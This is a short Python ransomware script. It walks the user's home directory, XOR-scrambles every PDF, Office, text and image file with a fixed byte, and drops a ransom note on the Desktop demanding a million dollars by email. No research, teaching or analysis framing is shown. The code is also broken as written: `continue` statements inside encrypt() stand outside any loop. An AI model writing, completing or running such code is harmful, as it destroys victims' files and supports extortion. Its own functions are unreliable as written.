import os

exts = ['.pdf', '.docx', '.ppt', '.txt', '.xls', '.png', '.jpg']


#gets list of files for encryption
def start(userdir):
    for root, dirs, files in os.walk(userdir, topdown=True):
        for name in files:
            target = os.path.join(root,name)
            ext = os.path.splitext(name)
            if ext[1] in exts:
                encrypt(target)


def xord(data):
    return bytearray([b^0xA8 for b in bytearray(data)])


#It will XOR the data from a file once with b^0xA8
def encrypt(file):
    try:
        with open(file, 'rb') as f:
            data = f.read()
    except:
        continue
    try:
        with open(file, 'wb') as fp:
            fp.write(xord(data))
    except:
        continue

def note(userdir):
    note = """ 
    lmao yout got owned,
    I need 1 million dollars to ransomguy@sh4man.dev
    """
    notepath = os.path.join(userdir, "Desktop", "README_TO_DECRPYPT.txt")
    with open(notepath, 'w') as f:
        f.write(note)


def main():
    userdir = os.path.expanduser('~')
    note(userdir)
    start(userdir)

if __name__ == "__main__":
    main()
